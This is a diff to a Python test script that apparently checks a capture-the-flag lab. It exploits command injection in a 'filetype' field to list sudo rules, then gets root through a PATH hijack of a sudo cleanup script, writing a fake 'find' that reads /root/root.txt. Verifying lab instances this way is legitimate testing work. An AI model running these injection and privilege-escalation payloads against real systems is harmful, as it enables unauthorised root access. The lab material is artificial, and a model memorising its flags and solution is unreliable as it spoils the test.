@@ -65,18 +65,30 @@ assert status == 200 and EXPECTED_USER_FLAG.encode() in user_proof, (
 )
 print("PASS: filetype command injection executes as wizard and returns exact User Flag", flush=True)
 
+submit("jpg; sudo -n -l > public/ui_images/sudo-rules.txt 2>&1;#")
+status, _, sudo_rules = request("/ui_images/sudo-rules.txt")
+assert status == 200 and b"/opt/cleanup.sh" in sudo_rules and b"NOPASSWD" in sudo_rules, (
+    "The expected passwordless cleanup-script sudo rule is missing: " + repr(sudo_rules[:500])
+)
+print("PASS: wizard has the expected native sudo SETENV cleanup-script rule", flush=True)
+
 root_payload = (
-    "jpg; printf '%s\\n' '#!/bin/sh' "
-    "'/usr/bin/id > public/ui_images/root-proof.txt' "
-    "'/bin/cat /root/root.txt >> public/ui_images/root-proof.txt' "
-    "> find; chmod 0755 find; "
-    "sudo PATH=/home/wizard/photobomb:/usr/bin:/bin /opt/cleanup.sh;#"
+    "jpg; printf '%s\\\\n' '#!/bin/sh' "
+    "'/usr/bin/id > /home/wizard/photobomb/public/ui_images/root-proof.txt' "
+    "'/bin/cat /root/root.txt >> /home/wizard/photobomb/public/ui_images/root-proof.txt' "
+    "> /home/wizard/photobomb/find; chmod 0755 /home/wizard/photobomb/find; "
+    "sudo -n PATH=/home/wizard/photobomb:/usr/bin:/bin /opt/cleanup.sh "
+    "> /home/wizard/photobomb/public/ui_images/sudo-output.txt 2>&1;#"
 )
 submit(root_payload)
 status, _, root_proof = request("/ui_images/root-proof.txt")
-assert status == 200 and b"uid=0(root)" in root_proof, (
-    "The real sudo cleanup script did not execute the PATH-resolved program as UID 0"
-)
+if status != 200 or b"uid=0(root)" not in root_proof:
+    debug_status, _, debug = request("/ui_images/sudo-output.txt")
+    raise AssertionError(
+        "PATH-hijack root proof missing; sudo output status="
+        + str(debug_status) + " body=" + repr(debug[:1000])
+        + " root_status=" + str(status) + " root_body=" + repr(root_proof[:1000])
+    )
 assert EXPECTED_ROOT_FLAG.encode() in root_proof, (
     "The PATH-hijack route did not return the exact per-instance Root Flag"
 )
